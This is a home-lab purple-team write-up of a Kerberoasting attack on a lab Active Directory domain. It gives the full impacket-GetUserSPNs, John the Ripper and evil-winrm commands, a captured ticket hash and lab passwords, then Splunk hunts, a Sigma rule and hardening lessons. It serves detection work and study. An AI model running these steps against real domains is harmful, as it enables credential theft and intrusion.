# Sprint 1 — Attack 3: Kerberoasting
## TGS Request → RC4 Hash Capture → Offline Crack → svc-jenkins Compromised

> **Status:** ✅ COMPLETE
> **Date:** 2026-04-23
> **Attacker:** Kali — 10.10.10.99
> **Target:** svc-jenkins (SPN: HTTP/jenkins.corp.local)
> **Starting credentials:** jsmith:Password123! (obtained ATK-001)
> **Outcome:** svc-jenkins password cracked → WinRM shell on DC01 as svc-jenkins
> **Incident ID:** ATK-003

---

## Table of Contents

1. Overview
2. Stage 1 — SPN Enumeration
3. Stage 2 — TGS Ticket Request
4. Stage 3 — Offline Hash Cracking
5. Stage 4 — Access Verification (WinRM as svc-jenkins)
6. SOC Hunt — Blue Team
7. Detections Built
8. Visibility Gaps
9. Sigma Rule
10. MITRE ATT&CK Map
11. Lessons Learned

---

## Overview

Kerberoasting abuses a fundamental feature of the Kerberos authentication protocol — any authenticated domain user can request a Kerberos service ticket (TGS) for any service registered in Active Directory. That ticket is encrypted with the service account's password hash. The attacker takes the ticket offline and cracks it. No special privileges required. No network noise. The DC hands the ticket over willingly because the request is completely legitimate.

### Kill Chain Summary

```
Valid domain creds (jsmith:Password123!) — from ATK-001
     ↓
Enumerate SPNs — find Kerberoastable service accounts
     ↓
Request TGS ticket for svc-jenkins from DC01
     ↓
DC01 returns ticket encrypted with svc-jenkins's hash
     ↓
Save hash → crack offline with John
     ↓
Service@2025! recovered → WinRM shell as svc-jenkins
```

### Why This Attack Matters

Kerberoasting requires **zero special privileges** — just a valid domain account. Any user, even the most locked-down one, can perform it. It targets service accounts which typically have:
- Weak passwords set years ago and never rotated
- High privileges (service accounts often have admin rights)
- No MFA or interactive login monitoring

In a real enterprise, Kerberoasting a single service account with domain admin rights means full domain compromise in seconds — no lateral movement needed.

### How This Differs from Previous Attacks

| | ATK-001 LLMNR | ATK-002 SMB Relay | ATK-003 Kerberoasting |
|---|---|---|---|
| Starting point | Zero creds | Zero creds | Valid domain user |
| Network position required | Same subnet | Same subnet | Anywhere with DC access |
| Victim interaction needed | Yes (browse to fake share) | Yes (browse to fake share) | None |
| Network noise | Moderate | Moderate | Minimal |
| Cracking required | Sometimes | No (if signing off) | Always |
| Target | Admin/users | Any account | Service accounts with SPNs |

---

## Stage 1 — SPN Enumeration

### What Is an SPN?

A Service Principal Name is a unique identifier for a service instance in Active Directory. When a service account is configured to run a service (like Jenkins), an SPN is registered linking that account to the service. This is what makes Kerberos authentication work for that service — and what makes the account Kerberoastable.

### MITRE Technique

`T1558.003 — Steal or Forge Kerberos Tickets: Kerberoasting`

### Command

```bash
impacket-GetUserSPNs corp.local/jsmith:Password123! -dc-ip 10.10.10.40
```

### Result

```
ServicePrincipalName     Name         MemberOf  PasswordLastSet              LastLogon
-----------------------  -----------  --------  --------------------------   ---------
HTTP/jenkins.corp.local  svc-jenkins            2026-03-26 17:51:39.721567   <never>
```

**Key observations:**
- `svc-jenkins` has SPN `HTTP/jenkins.corp.local` — Kerberoastable
- `LastLogon: <never>` — service account never interactively logged in, password likely never rotated
- `PasswordLastSet: 2026-03-26` — set at lab creation, static

### Detection Status

❌ Not detected — SPN enumeration via LDAP generates no Security event log entries. This is a completely silent reconnaissance step.

---

## Stage 2 — TGS Ticket Request

### What Happens

GetUserSPNs authenticates as jsmith, requests a TGT from DC01 (EC4768), then immediately requests a TGS for `HTTP/jenkins.corp.local` (EC4769). DC01 encrypts the TGS with svc-jenkins's RC4 hash (NT hash) and returns it. The attacker captures the encrypted blob.

### Command

```bash
impacket-GetUserSPNs corp.local/jsmith:Password123! -dc-ip 10.10.10.40 -request
```

### Result

```
$krb5tgs$23$*svc-jenkins$CORP.LOCAL$corp.local/svc-jenkins*$99aef2590c2a20f400daa2bec5118803$a41f6a522bd...
```

`$krb5tgs$23$` — the `23` = etype 23 = RC4-HMAC encryption. This is the Kerberoasting fingerprint. RC4 is requested because it produces a hash format (MD4/HMAC-MD5) that is significantly faster to crack than AES.

### Save the Hash

```bash
echo '$krb5tgs$23$*svc-jenkins$CORP.LOCAL$corp.local/svc-jenkins*$99aef259...' > /tmp/svc-jenkins.hash
```

### Detection Status

✅ Detected — EC4768 (TGT request) + EC4769 (TGS request) both logged on DC01 with `Client_Address=::ffff:10.10.10.99` and `Ticket_Encryption_Type=0x17`

---

## Stage 3 — Offline Hash Cracking

### MITRE Technique

`T1110.002 — Brute Force: Password Cracking`

### Wordlist

```bash
echo 'Service@2025!' >> /tmp/corp_wordlist.txt
```

Real attacker wordlist logic for service accounts:
- Company name variants (Corp, CORP)
- Service name (Jenkins, jenkins)
- Year + special char (2025!, @2025)
- Common service account patterns (Service@YEAR, Svc@YEAR)

### Command

```bash
john --format=krb5tgs --wordlist=/tmp/corp_wordlist.txt /tmp/svc-jenkins.hash
```

### Result

```
Service@2025!    (?)
1g 0:00:00:00 DONE (2026-04-23 12:04) 100.0g/s 1900p/s
Session completed.
```

Cracked instantly — password was in the wordlist. In a real engagement against an unknown password, a full rockyou.txt or hashcat with rules would be used.

### Detection Status

❌ Not detected — offline operation. No logging system can see this.

---

## Stage 4 — Access Verification

### What We Did

Verified the cracked password grants actual access to DC01 via WinRM:

```bash
evil-winrm -i 10.10.10.40 -u svc-jenkins -p 'Service@2025!'
```

### Result

```
Evil-WinRM shell v3.9
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\>
```

Shell confirmed on DC01 as svc-jenkins. Attack complete.

### What an Attacker Does Next

With svc-jenkins credentials the attacker can:
- Log into Jenkins web UI at `http://10.10.20.154:8080`
- Execute arbitrary code via Jenkins Groovy script console (ATK-006)
- Use svc-jenkins for lateral movement to jenkins-vm
- If svc-jenkins has elevated AD rights — escalate further

### Detection Status

✅ Detected — EC4624, NTLM, Logon_Type=3, src_ip=10.10.10.99 (same pattern as ATK-001)

---

## SOC Hunt — Blue Team

### Hunt Query 1 — T1 Triage: All RC4 TGS Requests (Kerberoasting Sweep)

This is the morning triage query — no prior knowledge of the attack needed. RC4 TGS requests for service accounts are always suspicious in a modern AD environment.

```spl
index=windows EventCode=4769
Ticket_Encryption_Type=0x17
| where NOT match(Service_Name, "\\$$")
| stats count by Account_Name, Service_Name, Client_Address
| sort -count
```

**Result:** 1 event — `jsmith@CORP.LOCAL` → `svc-jenkins` from `::ffff:10.10.10.99`

**T1 decision:** Escalate to T2. Regular user + service account + Linux source IP + RC4 = suspicious.

### Hunt Query 2 — T2 Investigation: Full Activity from Attacker IP

```spl
index=windows earliest=-1h
| search src_ip="::ffff:10.10.10.99" OR Client_Address="::ffff:10.10.10.99"
| stats count by EventCode, Account_Name, Service_Name
| sort -count
```

**Result:**
```
EC4768  jsmith        krbtgt       1
EC4769  jsmith@CORP   svc-jenkins  1
```

**T2 finding:** EC4768 (TGT) immediately followed by EC4769 (TGS) from same Linux IP — scripted Kerberoasting sequence confirmed.

### Hunt Query 3 — Full Attack Timeline

```spl
index=windows
| search src_ip="::ffff:10.10.10.99" OR Client_Address="::ffff:10.10.10.99"
| table _time, EventCode, Account_Name, Service_Name, Ticket_Encryption_Type
| sort _time
```

**Result:**
```
2026-04-23 18:01:36.724  4768  jsmith              krbtgt       0x17
2026-04-23 18:01:36.733  4769  jsmith@CORP.LOCAL   svc-jenkins  0x17
```

9ms between TGT and TGS request. No human does that. Confirmed automated tool execution.

### Hunt Query 4 — Broad Kerberoasting Detection (Production-Ready)

```spl
index=windows EventCode=4769
Ticket_Encryption_Type=0x17
| where NOT match(Service_Name, "\\$$")
| where NOT match(Client_Address, "^::1$")
| eval risk=case(
    match(Client_Address, "10\.10\.10\.99"), "CRITICAL - Known attacker IP",
    NOT match(Client_Address, "10\.10\.10\.(40|30|50)"), "HIGH - Non-domain host",
    true(), "MEDIUM - Review manually"
  )
| eval mitre="T1558.003 - Kerberoasting"
| table _time, Account_Name, Service_Name, Ticket_Encryption_Type, Client_Address, risk, mitre
| sort -_time
```

### Hunt Query 5 — Correlate with Subsequent svc-jenkins Login

Did the attacker use the cracked password to authenticate?

```spl
index=windows EventCode=4624
Account_Name=svc-jenkins
| table _time, Account_Name, Logon_Type, src_ip, Authentication_Package
| sort -_time
```

---

## Detections Built

| # | Detection | EventCode | Key Filter | Evidence | MITRE |
|---|---|---|---|---|---|
| 1 | RC4 TGS for service account | 4769 | `Ticket_Encryption_Type=0x17 AND Service_Name!=*$` | 1 event — svc-jenkins from 10.10.10.99 | T1558.003 |
| 2 | TGT + TGS in same second from Linux IP | 4768+4769 | 9ms gap, same Client_Address, non-domain host | 2 events — 18:01:36.724 and .733 | T1558.003 |
| 3 | svc-jenkins WinRM login post-crack | 4624 | `Account_Name=svc-jenkins, NTLM, src_ip=10.10.10.99` | EC4624 from Kali | T1021.006 |
| 4 | SPN enumeration (LDAP) | — | No Security log event generated | GAP — silent recon | T1558.003 |

### Splunk Alert Titles

| Alert | Severity |
|---|---|
| ALERT - Kerberoasting Detected: RC4 TGS for Service Account (T1558.003) | Critical |
| ALERT - Scripted Kerberos: TGT+TGS <1s from Non-Domain Host (T1558.003) | Critical |
| ALERT - Service Account WinRM Login from Linux Host (T1021.006) | High |

---

## Visibility Gaps

| ID | Gap | Root Cause | Impact | Fix |
|---|---|---|---|---|
| VIS-001 | Suricata blind to attack traffic | Same L2 subnet — traffic never crosses OPNsense | No network-layer detection | SPAN port mirroring (Sprint 4) |
| VIS-005 | SPN enumeration completely silent | LDAP queries generate no Security event log | Recon phase undetectable | Enable LDAP audit logging or deploy honeypot SPNs |

### New Gap — VIS-005

SPN enumeration via `GetUserSPNs` is completely invisible in Windows Security logs. The LDAP query that lists all Kerberoastable accounts leaves no trace. This is a significant detection gap — the attacker knows exactly which accounts to target before making a single noisy request.

**Fix options:**
- Enable LDAP query auditing (Directory Service Access audit policy — already done for 4662)
- Deploy a **honeypot SPN** — a fake service account with a strong password and an SPN set. Any TGS request for it is guaranteed malicious. Alert on it with zero false positives.
- Use a canary token approach — if the fake account's hash is ever cracked and used, immediate alert

---

## Sigma Rule

File: `sigma_kerberoasting_T1558.003.yml`

```yaml
title: Kerberoasting - RC4 TGS Request for Service Account
id: c8e4f2a1-3b5d-6e7f-9a0b-1c2d3e4f5a6b
status: stable
description: |
    Detects Kerberoasting attacks where a user requests a Kerberos service ticket
    (TGS) using RC4 encryption (etype 0x17) for a service account. Legitimate
    modern Kerberos clients request AES256 (0x12) or AES128 (0x11). RC4 requests
    are deliberately chosen by attackers because RC4 hashes crack significantly
    faster than AES. The filter excludes machine accounts (ending in $) and
    local/loopback sources.
references:
    - https://attack.mitre.org/techniques/T1558/003/
    - https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting
author: CorpLab SOC
date: 2026-04-23
tags:
    - attack.credential_access
    - attack.t1558.003
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4769
        TicketEncryptionType: '0x17'
    filter_machine_accounts:
        ServiceName|endswith: '$'
    filter_local:
        IpAddress:
            - '::1'
            - '127.0.0.1'
    condition: selection and not filter_machine_accounts and not filter_local
fields:
    - TargetUserName
    - ServiceName
    - TicketEncryptionType
    - IpAddress
falsepositives:
    - Legacy systems that only support RC4 (old Windows Server, some Linux clients)
    - Misconfigured Kerberos clients forcing RC4
    - AES not enabled on target service accounts (fix: set msDS-SupportedEncryptionTypes)
level: high
```

### SPL Translation

```spl
index=windows EventCode=4769
Ticket_Encryption_Type=0x17
| where NOT match(Service_Name, "\\$$")
| where NOT match(Client_Address, "^(::1|127\.0\.0\.1)$")
| eval mitre="T1558.003 - Kerberoasting"
| table _time, Account_Name, Service_Name, Ticket_Encryption_Type, Client_Address, mitre
```

---

## MITRE ATT&CK Map

| Stage | Technique ID | Technique Name | Tactic | Tool | Detected |
|---|---|---|---|---|---|
| 1 | T1558.003 | Kerberoasting — SPN enum | Credential Access | GetUserSPNs | ❌ VIS-005 (silent LDAP) |
| 2 | T1558.003 | Kerberoasting — TGS request | Credential Access | GetUserSPNs -request | ✅ EC4768+4769 |
| 3 | T1110.002 | Password Cracking | Credential Access | John the Ripper | ❌ Offline |
| 4 | T1021.006 | WinRM access as svc-jenkins | Lateral Movement | evil-winrm | ✅ EC4624 |

**Detection rate: 2/4 stages (50%)**

**Cumulative Sprint 1 detection rate across ATK-001 + ATK-002 + ATK-003: 8/14 technique instances (57%)**

---

## Deliverables

| File | Description |
|---|---|
| `sprint1-attack3-kerberoasting.md` | This document |
| `ATK-003.json` | Structured incident report |
| `sigma_kerberoasting_T1558.003.yml` | Sigma detection rule |

---

## Lessons Learned

### Attack Tradecraft

**SPN enumeration is completely silent.** GetUserSPNs makes LDAP queries that leave zero trace in Windows Security logs. An attacker can map every Kerberoastable account in the domain without triggering a single alert. The only defense at this stage is honeypot SPNs or LDAP audit logging.

**RC4 is the attacker's choice, not a mistake.** Modern Kerberos defaults to AES256. The tool deliberately downgrades to RC4 because MD4/HMAC-MD5 (RC4) cracks at billions of attempts per second on modern hardware vs millions for AES. A strong password in AES might be safe; the same password in RC4 might not.

**Service accounts are the ideal target.** They typically have static passwords set years ago, never interactively monitored, often highly privileged, and rarely subject to MFA. They are the weakest link in most AD environments.

**The 9ms gap is the fingerprint.** No human requests a TGT and immediately requests a TGS for a specific service account 9 milliseconds later. Automated tooling is the only explanation. This temporal correlation is a reliable detection signal.

### Detection Engineering

**RC4 filtering is the primary signal.** In a modern AD environment, there is almost no legitimate reason for RC4 TGS requests. Filtering `Ticket_Encryption_Type=0x17` with service account names is a high-fidelity detection with very low false positive rate.

**Honeypot SPNs are zero-false-positive detections.** Create a fake service account with a strong password and a registered SPN. Never use it for anything. Any TGS request for it is 100% malicious. This closes VIS-005 completely and cheaply.

**Correlate EC4768 + EC4769 timing.** A legitimate user authenticating and then accessing a service will have a natural time gap between TGT issuance and TGS request. Scripted Kerberoasting collapses this to milliseconds.

### Infrastructure

**Service accounts need managed passwords.** Group Managed Service Accounts (gMSA) automatically rotate passwords every 30 days to a 240-character random value — impossible to Kerberoast effectively. This is the architectural fix for Kerberoasting.

**AES must be enforced.** Setting `msDS-SupportedEncryptionTypes` to AES only on service accounts forces AES tickets, making offline cracking impractical. Disabling RC4 domain-wide eliminates Kerberoasting entirely.

**RAM management is critical in a constrained home lab.** Running jenkins-vm alongside OPNsense + DC01 + Kali + blue-vm exceeded available RAM and caused OPNsense and blue-vm to freeze. Rule: never run jenkins-vm or prod-vm simultaneously with blue-vm on a 16GB host. Rotate VMs based on the active task.

---

## Next: Attack 4 — AS-REP Roasting

AS-REP Roasting targets accounts with Kerberos pre-authentication **disabled**. Instead of needing valid credentials first, the attacker requests an AS-REP directly for the target account — the DC responds with data encrypted with the account's hash, no authentication required.

- **Tool:** `impacket-GetNPUsers`
- **Target:** `jdoe` (pre-auth disabled in corp.local)
- **MITRE:** `T1558.004 — AS-REP Roasting`
- **Key difference from Kerberoasting:** No valid creds needed to start — just a username
- **VMs needed:** Kali + DC01 + blue-vm
